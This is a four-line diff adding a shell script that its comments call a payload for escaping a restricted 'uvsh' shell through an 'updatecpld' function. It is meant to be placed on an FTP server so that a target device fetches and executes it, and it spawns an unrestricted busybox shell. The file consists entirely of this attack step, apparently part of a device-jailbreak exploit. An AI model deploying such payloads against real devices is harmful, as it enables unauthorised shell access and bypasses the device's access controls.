@@ -1,0 +1,4 @@
+#!/bin/sh
+# Payload for uvsh escape via updatecpld
+# Place on FTP server, device will fetch and execute
+/bin/busybox sh
